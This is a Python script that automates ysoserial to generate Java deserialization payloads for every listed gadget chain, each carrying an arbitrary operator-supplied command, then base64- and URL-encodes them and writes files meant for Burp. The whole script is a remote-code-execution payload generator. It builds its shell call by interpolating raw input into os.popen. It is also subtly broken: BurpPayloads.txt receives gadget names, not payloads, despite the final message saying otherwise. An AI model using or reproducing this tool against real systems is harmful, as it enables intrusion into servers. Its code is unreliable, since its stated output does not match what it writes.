import os
import base64
import urllib.parse
from colorama import Fore, Style

logo = """
┏┳┳┓ ┏┓    ┓     ┓╹ 
 ┃┃┃ ┃┃┏┓┓┏┃┏┓┏┓┏┫ ┓
┗┛┻┛━┣┛┗┻┗┫┗┗┛┗┻┗┻ ┗
          ┛         
ENG. Khaled Alshammri


"""
print(f"{Fore.BLUE}{logo}{Style.RESET_ALL}")
# Step 1: Ask user to insert the command
command = input("Enter the command: ")

# Step 2: Ask user to insert the gadgets.txt file path
gadgets_file_path = input("Enter the path of gadgets.txt file: ")

# Step 3: Execute the command and encode the output
with open(gadgets_file_path, 'r') as gadgets_file:
    gadgets = gadgets_file.readlines()

generated_files = []
error_files = []
for gadget in gadgets:
    gadget = gadget.strip()
    result = os.popen(f'PATH=/usr/lib/jvm/java-11-openjdk-amd64/bin:$PATH java -jar ysoserial-all.jar {gadget} \'{command}\' | base64 | tr -d "\n"').read()

    # Step 4: Create Payloads folder and save the result in text files
    folder_path = "Payloads"
    if not os.path.exists(folder_path):
        os.makedirs(folder_path)

    filename = f"{folder_path}/{gadget}.txt"
    with open(filename, 'w') as output_file:
        encoded_result = urllib.parse.quote(result)
        output_file.write(encoded_result)

    # Step 5: Add the payload to the appropriate list based on file status
    if os.path.exists(filename) and os.path.getsize(filename) > 0:
        generated_files.append(gadget)
    else:
        error_files.append(gadget)

# Step 6: Generate the BurpPayloads.txt file
with open("BurpPayloads.txt", 'w') as burp_payloads_file:
    burp_payloads_file.write("\n".join(encoded_result for encoded_result in generated_files))
print(f"{Fore.BLUE}-{Style.RESET_ALL}" * 100)

# Step 7: Print the lists with colored output
if generated_files:
    print(f"Generated Files ({len(generated_files)}):")
    for gadget in generated_files:
        print(f"{Fore.GREEN}{gadget}{Style.RESET_ALL}")
else:
    print(f"{Fore.RED}No files generated successfully.{Style.RESET_ALL}")

if error_files:
    print(f"\nError Files ({len(error_files)}):")
    for gadget in error_files:
        print(f"{Fore.RED}{gadget}{Style.RESET_ALL}")
else:
    print(f"\n{Fore.GREEN}All files generated successfully.{Style.RESET_ALL}")

print(f"{Fore.BLUE}The file BurpPayloads.txt contains payloads that have been encoded with Base64 and URL encoded.{Style.RESET_ALL}")
print(f"{Fore.GREEN}Good luck.{Style.RESET_ALL}")
